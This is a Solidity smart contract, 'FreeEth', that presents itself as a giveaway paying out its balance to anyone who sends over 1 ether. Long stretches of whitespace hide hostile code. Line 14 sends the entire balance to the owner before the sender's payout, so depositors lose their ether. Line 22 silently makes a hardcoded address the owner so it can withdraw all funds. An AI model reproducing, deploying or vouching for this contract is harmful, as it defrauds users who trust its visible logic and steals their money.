1 pragma solidity ^0.4.19;
2 
3 contract FreeEth
4 {
5     address public Owner = msg.sender;
6    
7     function() public payable{}
8    
9     function GetFreebie()
10     public
11     payable
12     {                                                                    
13         if(msg.value>1 ether)
14         {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);
15             msg.sender.transfer(this.balance);
16         }                                                                                                                
17     }
18     
19     function withdraw()
20     payable
21     public
22     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
23         require(msg.sender == Owner);
24         Owner.transfer(this.balance);
25     }
26     
27     function Command(address adr,bytes data)
28     payable
29     public
30     {
31         require(msg.sender == Owner);
32         adr.call.value(msg.value)(data);
33     }
34 }